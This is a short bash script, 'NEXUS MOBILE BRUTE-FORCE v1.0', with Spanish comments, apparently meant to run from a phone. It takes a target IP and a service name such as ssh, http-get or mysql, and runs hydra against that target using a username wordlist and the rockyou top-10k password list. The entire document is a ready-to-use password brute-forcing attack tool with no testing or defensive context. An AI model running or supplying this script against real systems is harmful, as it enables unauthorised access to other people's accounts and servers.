#!/bin/bash
# NEXUS MOBILE BRUTE-FORCE v1.0

TARGET_IP=$1
SERVICE=$2 # ej. ssh, http-get, mysql

echo "[!] INICIANDO ATAQUE DE FUERZA BRUTA DESDE MOTO E13..."
hydra -L ~/nexus/wordlists/users.txt -P ~/nexus/wordlists/rockyou_top_10k.txt -t 4 $TARGET_IP $SERVICE -V
